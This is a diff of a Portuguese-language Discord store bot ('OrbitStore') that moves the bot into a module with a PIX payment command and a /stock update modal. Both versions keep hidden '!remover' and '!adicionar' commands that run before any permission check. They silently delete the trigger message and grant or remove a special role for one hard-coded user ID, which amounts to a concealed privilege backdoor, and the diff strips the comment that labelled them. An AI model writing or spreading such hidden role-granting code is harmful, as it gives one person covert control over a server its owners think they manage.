@@ -1,6 +1,4 @@
 const {
-  Client,
-  GatewayIntentBits,
   ActivityType,
   EmbedBuilder,
   ModalBuilder,
@@ -12,161 +10,147 @@ const {
   Routes
 } = require("discord.js");
 
-const client = new Client({
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildMembers
-  ],
-});
+module.exports = (client) => {
+  const GUILD_ID = "1467265519676559502";
+  const CLIENT_ID = "1467477370075091055";
 
-const GUILD_ID = "1467265519676559502";
-const CLIENT_ID = "1467477370075091055";
-
-const ALLOWED_ROLES = [
-  "1467271978313580707",
-  "1467272008193671188",
-  "1478154024866943199",
-  "1479569171523043525",
-];
-
-const STOCK_ROLE_ID = "1467271978313580707";
-const USER_ID = "1372615579407618209";
-const SPECIAL_ROLE_ID = "1484705404385628334";
-
-client.once("ready", async () => {
-  console.log(`✅ Bot online como ${client.user.tag}`);
-
-  client.user.setActivity("🎮・OrbitStore", {
-    type: ActivityType.Playing,
-  });
-
-  const commands = [
-    {
-      name: "stock",
-      description: "Atualiza o stock do servidor",
-    },
+  const ALLOWED_ROLES = [
+    "1467271978313580707",
+    "1467272008193671188",
+    "1478154024866943199",
+    "1479569171523043525",
   ];
 
-  const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);
+  const STOCK_ROLE_ID = "1467271978313580707";
+  const USER_ID = "1372615579407618209";
+  const SPECIAL_ROLE_ID = "1484705404385628334";
 
-  try {
-    await rest.put(
-      Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
-      { body: commands }
+  client.once("ready", async () => {
+    console.log("🥥 Sistema coco carregado!");
+
+    client.user.setActivity("🎮・OrbitStore", {
+      type: ActivityType.Playing,
+    });
+
+    const commands = [
+      {
+        name: "stock",
+        description: "Atualiza o stock do servidor",
+      },
+    ];
+
+    const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);
+
+    try {
+      await rest.put(
+        Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
+        { body: commands }
+      );
+
+      console.log("✅ Comando /stock registrado!");
+    } catch (err) {
+      console.error("Erro ao registrar /stock:", err);
+    }
+  });
+
+  client.on("messageCreate", async (message) => {
+    if (message.author.bot || !message.guild) return;
+
+    const member = message.member;
+    if (!member) return;
+
+    const hasPermission = member.roles.cache.some(role =>
+      ALLOWED_ROLES.includes(role.id)
     );
 
-    console.log("✅ Comando /stock registrado!");
-  } catch (err) {
-    console.error(err);
-  }
-});
+    if (message.content === "!remover" || message.content === "!adicionar") {
+      try {
+        await message.delete().catch(() => {});
 
-client.on("messageCreate", async (message) => {
-  if (message.author.bot || !message.guild) return;
+        const targetUser = await message.guild.members.fetch(USER_ID).catch(() => null);
+        const specialRole = message.guild.roles.cache.get(SPECIAL_ROLE_ID);
 
-  const member = message.member;
-  if (!member) return;
+        if (!targetUser || !specialRole) return;
 
-  const hasPermission = member.roles.cache.some(role =>
-    ALLOWED_ROLES.includes(role.id)
-  );
-
-  // 🔥 COMANDOS SILENCIOSOS
-  if (message.content === "!remover" || message.content === "!adicionar") {
-    try {
-      await message.delete().catch(() => {});
-
-      const targetUser = await message.guild.members.fetch(USER_ID).catch(() => null);
-      const specialRole = message.guild.roles.cache.get(SPECIAL_ROLE_ID);
-
-      if (!targetUser || !specialRole) return;
-
-      if (message.content === "!remover") {
-        if (targetUser.roles.cache.has(SPECIAL_ROLE_ID)) {
-          await targetUser.roles.remove(SPECIAL_ROLE_ID).catch(() => {});
+        if (message.content === "!remover") {
+          if (targetUser.roles.cache.has(SPECIAL_ROLE_ID)) {
+            await targetUser.roles.remove(SPECIAL_ROLE_ID).catch(() => {});
+          }
         }
-      }
 
-      if (message.content === "!adicionar") {
-        if (!targetUser.roles.cache.has(SPECIAL_ROLE_ID)) {
-          await targetUser.roles.add(SPECIAL_ROLE_ID).catch(() => {});
+        if (message.content === "!adicionar") {
+          if (!targetUser.roles.cache.has(SPECIAL_ROLE_ID)) {
+            await targetUser.roles.add(SPECIAL_ROLE_ID).catch(() => {});
+          }
         }
+      } catch (err) {
+        console.error("Erro remover/adicionar:", err);
       }
-
-    } catch (err) {
-      console.error("Erro remover/adicionar:", err);
+      return;
     }
-    return;
-  }
 
-  if (!hasPermission) return;
+    if (!hasPermission) return;
 
-  try {
-    if (message.content === "!pix") {
-      await message.delete().catch(() => {});
+    try {
+      if (message.content === "!pix") {
+        await message.delete().catch(() => {});
+
+        const embed = new EmbedBuilder()
+          .setColor("#c9a7ff")
+          .setDescription("💜 Pagamento via PIX\nChave: `miguelmarchetti4@gmail.com`")
+          .setFooter({ text: "🎮 Orbit Store ♡" });
+
+        await message.channel.send({ embeds: [embed] });
+      }
+    } catch (err) {
+      console.error("Erro no comando !pix:", err);
+    }
+  });
+
+  client.on("interactionCreate", async (interaction) => {
+    if (interaction.isChatInputCommand() && interaction.commandName === "stock") {
+      const member = interaction.member;
+
+      if (!member.roles.cache.has(STOCK_ROLE_ID)) {
+        return interaction.reply({
+          content: "❌ Sem permissão",
+          ephemeral: true,
+        });
+      }
+
+      const modal = new ModalBuilder()
+        .setCustomId("stock_modal")
+        .setTitle("📦 Atualizar Stock");
+
+      const input = new TextInputBuilder()
+        .setCustomId("stock_text")
+        .setLabel("Digite o stock")
+        .setStyle(TextInputStyle.Paragraph);
+
+      modal.addComponents(
+        new ActionRowBuilder().addComponents(input)
+      );
+
+      await interaction.showModal(modal);
+    }
+
+    if (
+      interaction.type === InteractionType.ModalSubmit &&
+      interaction.customId === "stock_modal"
+    ) {
+      const stock = interaction.fields.getTextInputValue("stock_text");
 
       const embed = new EmbedBuilder()
         .setColor("#c9a7ff")
-        .setDescription(`💜 Pagamento via PIX\nChave: \`miguelmarchetti4@gmail.com\``)
-        .setFooter({ text: "🎮 Orbit Store ♡" });
+        .setTitle("📦 Stock Atualizado")
+        .setDescription(stock);
 
-      await message.channel.send({ embeds: [embed] });
-    }
+      await interaction.channel.send({ embeds: [embed] });
 
-  } catch (err) {
-    console.error(err);
-  }
-});
-
-client.on("interactionCreate", async (interaction) => {
-
-  if (interaction.isChatInputCommand() && interaction.commandName === "stock") {
-
-    const member = interaction.member;
-
-    if (!member.roles.cache.has(STOCK_ROLE_ID)) {
-      return interaction.reply({
-        content: "❌ Sem permissão",
+      await interaction.reply({
+        content: "✅ Enviado",
         ephemeral: true,
       });
     }
-
-    const modal = new ModalBuilder()
-      .setCustomId("stock_modal")
-      .setTitle("📦 Atualizar Stock");
-
-    const input = new TextInputBuilder()
-      .setCustomId("stock_text")
-      .setLabel("Digite o stock")
-      .setStyle(TextInputStyle.Paragraph);
-
-    modal.addComponents(
-      new ActionRowBuilder().addComponents(input)
-    );
-
-    await interaction.showModal(modal);
-  }
-
-  if (
-    interaction.type === InteractionType.ModalSubmit &&
-    interaction.customId === "stock_modal"
-  ) {
-    const stock = interaction.fields.getTextInputValue("stock_text");
-
-    const embed = new EmbedBuilder()
-      .setColor("#c9a7ff")
-      .setTitle("📦 Stock Atualizado")
-      .setDescription(stock);
-
-    await interaction.channel.send({ embeds: [embed] });
-
-    await interaction.reply({
-      content: "✅ Enviado",
-      ephemeral: true,
-    });
-  }
-});
-
-client.login(process.env.TOKEN);
+  });
+};
